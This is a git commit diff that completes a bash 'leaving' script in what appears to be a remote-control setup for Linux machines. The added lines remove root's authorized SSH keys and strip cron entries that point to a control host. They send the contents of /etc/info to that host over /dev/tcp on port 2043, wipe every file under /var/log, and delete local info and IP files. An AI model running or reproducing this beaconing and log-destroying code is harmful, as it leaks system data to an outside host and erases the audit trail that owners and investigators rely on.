529759df6652ddbb1e3390395622353cd4914133
ErikBoesen <me@erikboesen.com>
2018-04-02 17:17:24 -0400

    Complete Linux leaving script

--- control/linux/leave.sh
+++ control/linux/leave.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
+host=boesen.science
 
 echo "Removing pubkey..."
 rm /root/.ssh/authorized_keys
+echo "Removing crontabs..."
 
 read -p "Disable SSH (not recommended)? [y/N] " -n 1 -r
 if [[ $REPLY =~ ^[Yy]$ ]]; then
@@ -12,3 +14,10 @@ if [[ $REPLY =~ ^[Yy]$ ]]; then
 	systemctl disable ssh.service
 	echo " done."
 fi
+
+grep -v "$host" /var/spool/cron/tabs/root > /tmp/crontab
+mv /tmp/crontab /var/spool/cron/tabs
+
+printf "EXIT: $(< /etc/info) leaving network." >/dev/tcp/$host/2043
+rm -rf /var/log/*
+rm -rf /etc/info /etc/ips
